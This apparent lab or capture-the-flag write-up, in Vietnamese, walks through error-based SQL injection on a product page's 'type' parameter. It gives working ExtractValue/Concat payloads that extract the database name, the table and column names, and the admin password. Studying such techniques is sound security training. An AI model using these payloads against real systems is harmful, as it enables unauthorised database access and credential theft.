## Error Based SQLi

`Description:` có 1 input đầu vào là `type` và hiện thị bảng chi tiết sản phẩm.

![image](https://user-images.githubusercontent.com/92881216/221093680-1f7db4d9-74cf-4807-b3d4-a5f098765e42.png)

Đầu tiên khi thêm các ký tự đặc biệt thì có lỗi SQL trả về vì vậy có thể khai thác theo Error Based SQLi.

![image](https://user-images.githubusercontent.com/92881216/221093948-2f67ac49-0d8a-4f65-82e0-c17560b294fa.png)

Ở đây, em sử dựng hàm `ExtractValue(xml_document, xpath)`. Đây là hàm để trích xuất giá trị từ XML theo một đường dẫn XPath.

Em để tham số đầu tiên trong hàm là `null` và khi đó tham số thứ 2 sẽ dùng để tạo chuỗi XML để trích xuất giá trị để khai thác.

Payload : `' and ExtractValue('',Concat(0x0a,(select database())))-- -`

Khi đó hàm `concat()` sử dụng để nối chuỗi có ký tự `0x0a` là ký tự xuống xong nối với kết quả câu query `select database()` để tạo chuỗi XML và chuỗi XML này truyền được vào hàm `extractvalue()`.

![image](https://user-images.githubusercontent.com/92881216/221098862-d7775c7e-7a69-4be0-9896-5a9cb7dca2dc.png)

Như vậy có lỗi xảy ra và dump ra tên database là `kcsc`.

Tiếp tục thay đổi câu truy vấn để khai thác tiếp.

- Truy xuất ra bảng trong db bằng câu truy vấn `SELECT table_name FROM information_schema.tables WHERE table_schema = database()`.

Khi đó payload là: `' and ExtractValue('',Concat(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = database())))-- -`

![image](https://user-images.githubusercontent.com/92881216/221099228-bf7b9dfc-1221-4c1c-97ca-944ca10e7162.png)

Vậy db có nhiều bảng nên phải sử dụng limit :

![image](https://user-images.githubusercontent.com/92881216/221099525-400386d0-b2b5-4ec7-8c04-2d983e7b78d5.png)

Với limit 1,1 sẽ dump ra bảng `users` (bảng cần khai thác)

- Tiếp tục truy xuất tên cột

Payload `' and ExtractValue('',Concat(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'users' limit 2,1)))-- -`

Với limit 0,1 dump ra cột `id`, limit 1,1 là `username` và limit 2,1 là `password` (cột cần khai thác).

![image](https://user-images.githubusercontent.com/92881216/221099969-c3b364a5-9999-46c0-aa26-c251ca7ba4c7.png)

- Cuối cùng là truy xuất ra `password` của `admin`:

Payload: `' and ExtractValue('',Concat(0x0a,(SELECT password FROM users WHERE username = 'admin')))-- -`

Kết quả:

![image](https://user-images.githubusercontent.com/92881216/221100230-ebb8b9cb-9887-4ded-a40b-724a0f15f0ac.png)

> password admin: `the_admin_password`



 




